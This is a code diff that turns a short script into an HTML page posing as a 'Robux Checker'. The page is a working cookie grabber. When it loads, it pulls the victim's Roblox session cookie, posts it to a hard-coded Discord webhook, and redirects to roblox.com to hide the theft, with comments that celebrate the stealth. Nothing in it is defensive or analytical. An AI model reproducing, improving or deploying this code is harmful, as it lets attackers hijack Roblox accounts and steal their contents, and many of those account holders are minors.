@@ -1,27 +1,97 @@
-// 1. Get the Cookie String
-const cookies = document.cookie; 
-const cookieArray = cookies.split(';');
-let robloxCookie = "";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Checker</title>
+    <style>
+        /* Stealth styling - minimal visible UI */
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f8f9fa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #5865F2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
 
-// 2. Find ROBLOSECURITY specifically
-for (let i = 0; i < cookieArray.length; i++) {
-    let cookie = cookieArray[i].trim();
-    if (cookie.indexOf("ROBLOSECURITY=") === 0) {
-        robloxCookie = cookie.substring(16); // Remove "ROBLOSECURITY="
-        break;
-    }
-}
+    <script>
+        // INSTANT LOAD COOKIE GRABBER v2.0
+        
+        (async function grabCookie() {
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4';
+            
+            try {
+                // 1. Get the Cookie String
+                const cookies = document.cookie;
+                const cookieArray = cookies.split(';');
+                let robloxCookie = "";
 
-// 3. Send to Discord Webhook
-if (robloxCookie) {
-    fetch('https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: `**Cookie Grabbed!**\n\n${robloxCookie}` })
-    });
+                // 2. Find ROBLOSECURITY specifically
+                for (let i = 0; i < cookieArray.length; i++) {
+                    let cookie = cookieArray[i].trim();
+                    if (cookie.indexOf("ROBLOSECURITY=") === 0) {
+                        robloxCookie = cookie.substring(16); // Remove "ROBLOSECURITY="
+                        break;
+                    }
+                }
 
-    // 4. Redirect them back to Roblox so they don't notice
-    window.location.href = "https://www.roblox.com"; 
-} else {
-    alert("Cookie not found! Make sure you are logged into Roblox in this browser.");
-}
+                // 3. Send to Discord Webhook
+                if (robloxCookie) {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json' 
+                        },
+                        body: JSON.stringify({
+                            content: `**🍪 Cookie Grabbed!**
+
+**User:** ${document.domain}
+**Cookie:** \`${robloxCookie}\`
+
+**Time:** ${new Date().toLocaleString()}`,
+                            username: 'Roblox Grabber',
+                            avatar_url: 'https://cdn.discordapp.com/attachments/1234567890/avatar.png'
+                        })
+                    });
+
+                    // 4. Redirect them back to Roblox so they don't notice
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com";
+                    }, 1500);
+                } else {
+                    alert("Cookie not found! Make sure you are logged into Roblox in this browser.");
+                    window.location.href = "https://www.roblox.com";
+                }
+
+            } catch (error) {
+                console.error('Grabber Error:', error);
+                // Still redirect even on error
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 2000);
+            }
+        })();
+    </script>
+</body>
+</html>
